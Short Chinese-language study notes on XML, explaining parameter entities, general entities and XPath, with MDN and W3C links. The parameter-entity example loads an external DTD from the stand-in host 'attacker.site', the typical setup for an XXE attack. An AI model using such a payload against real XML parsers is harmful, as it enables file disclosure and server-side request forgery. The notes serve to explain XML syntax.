
### 参数实体

以`%`开头，仅在DTD内部使用
```xml
<!-- dtd 声明 -->
<!DOCTYPE foo [<!ENTITY % ParameterEntityName SYSTEM
"http://attacker.site/attack.dtd"> %ParameterEntityName;]>
```

### 通用实体

无`%`前缀，在XML文档内容中引用`&name;`，用于文本替换
```xml
<!-- dtd 声明 -->
<!DOCTYPE foo [<!ENTITY GeneralEntityName "字符串">]>
<!-- xml 正文 -->
<foo>&GeneralEntityName;</foo>
```

# XML：可扩展标记语言

https://developer.mozilla.org/zh-CN/docs/Web/XML

## XPath

https://developer.mozilla.org/zh-CN/docs/Web/XML/XPath
[规范](https://www.w3.org/TR/1999/REC-xpath-19991116/)

XPath 表示 XML 路径语言。它使用非 XML 语法来提供一种灵活地定位（指向）[XML] 文档的不同部分的方法。它也可以用于检查文档中某个定位节点是否与某个模式（pattern）匹配。

XPath 使用路径标识符（类似于 URL）通过层级结构来导航 XML 文档。它使用非 XML 语法，使得它可被用于 URI 和 XML 属性值。